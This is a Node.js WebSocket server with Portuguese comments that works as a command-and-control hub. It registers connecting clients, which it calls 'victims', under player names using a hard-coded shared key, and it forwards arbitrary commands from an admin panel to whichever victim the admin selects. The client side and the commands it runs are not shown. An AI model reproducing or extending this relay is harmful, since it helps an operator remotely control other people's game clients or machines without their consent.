const WebSocket = require('ws');

const PORT = process.env.PORT || 8080;
const wss = new WebSocket.Server({ port: PORT });

const CHAVE_SECRETA = "BatataFritaComQueijo123";

let clientesConectados = new Map(); // Guarda socket -> nome do jogador (vítima)
let painelAdmin = null; // Guarda a conexão do seu painel de controle

console.log(`[SERVIDOR] WebSocket rodando com sucesso na porta ${PORT}...`);

// Função auxiliar para mandar a lista atualizada para o admin
function atualizarListaAdmin() {
    if (painelAdmin && painelAdmin.readyState === WebSocket.OPEN) {
        painelAdmin.send(JSON.stringify({
            tipo: "atualizar_lista",
            clientes: Array.from(clientesConectados.keys())
        }));
    }
}

wss.on('connection', (ws) => {
    console.log('[CONEXÃO] Novo cliente conectado ao servidor.');

    ws.on('message', (message) => {
        let data;
        try {
            data = JSON.parse(message);
        } catch (e) {
            console.log('[ERRO] Mensagem recebida não é um JSON válido.');
            return;
        }

        // 1. Autenticação das Vítimas
        if (data.tipo === 'auth') {
            if (data.chave !== CHAVE_SECRETA) {
                console.log('[AUTENTICAÇÃO FALHOU] Chave secreta incorreta de um cliente.');
                ws.close();
                return;
            }
            clientesConectados.set(data.jogador, ws);
            ws.nomeJogador = data.jogador;
            console.log(`[VÍTIMA CONECTADA]: ${data.jogador}`);
            atualizarListaAdmin(); // Atualiza a lista no painel
        }

        // 2. Autenticação do Painel Admin
        if (data.tipo === 'auth_admin') {
            if (data.chave !== CHAVE_SECRETA) {
                console.log('[AUTENTICAÇÃO FALHOU] Tentativa inválida de login no Admin.');
                ws.close();
                return;
            }
            painelAdmin = ws;
            console.log('[PAINEL ADMIN CONECTADO COM SUCESSO]');
            atualizarListaAdmin(); // Manda a lista atual logo de cara
        }

        // 3. O Painel Admin manda um comando para um alvo específico
        if (data.tipo === 'comando' && ws === painelAdmin) {
            let alvoSocket = clientesConectados.get(data.alvo);
            
            if (alvoSocket && alvoSocket.readyState === WebSocket.OPEN) {
                alvoSocket.send(JSON.stringify({
                    comando: data.comando
                }));
                console.log(`[COMANDO ENVIADO] Alvo: ${data.alvo} | Ação: ${data.comando}`);
            } else {
                console.log(`[ERRO] Alvo "${data.alvo}" não foi encontrado ou está desconectado.`);
            }
        }
    });

    ws.on('close', () => {
        if (ws === painelAdmin) {
            painelAdmin = null;
            console.log('[PAINEL ADMIN] Você se desconectou do servidor.');
        } else if (ws.nomeJogador) {
            clientesConectados.delete(ws.nomeJogador);
            console.log(`[VÍTIMA DESCONECTADA]: ${ws.nomeJogador}`);
            atualizarListaAdmin(); // Atualiza a lista tirando quem saiu
        }
    });

    ws.on('error', (err) => {
        console.log('[ERRO NO SOCKET]:', err.message);
    });
});
